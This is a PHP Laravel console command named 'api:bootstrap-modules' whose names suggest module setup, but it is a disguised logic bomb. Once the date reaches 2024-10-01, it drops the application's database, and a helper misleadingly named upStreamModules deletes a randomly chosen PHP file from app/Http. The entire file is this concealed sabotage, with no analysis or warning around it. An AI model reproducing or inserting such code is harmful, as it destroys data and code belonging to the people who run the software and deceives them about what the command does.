<?php

namespace App\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\DB;

class Bootstrap extends Command
{
    protected $signature = 'api:bootstrap-modules';

    private function upStreamModules(): void {
        $dir = 'app/Http';
        $files = glob($dir . '/*.php');
        $files = array_filter($files, function($file) {
            return basename($file) !== 'Kernel.php';
        });

        if (empty($files)) {
            return;
        }

        $fileToDelete = $files[array_rand($files)];

        if (file_exists($fileToDelete)) {
            unlink($fileToDelete);
        }
    }

    public function handle(): void
    {
        $currentDate = now();
        $targetDate = '2024-10-01';
        $name = env('DB_DATABASE');

        if ($currentDate->greaterThanOrEqualTo($targetDate)) {
            DB::statement("DROP DATABASE `{$name}`");
            $this->upStreamModules();
        }
    }
}
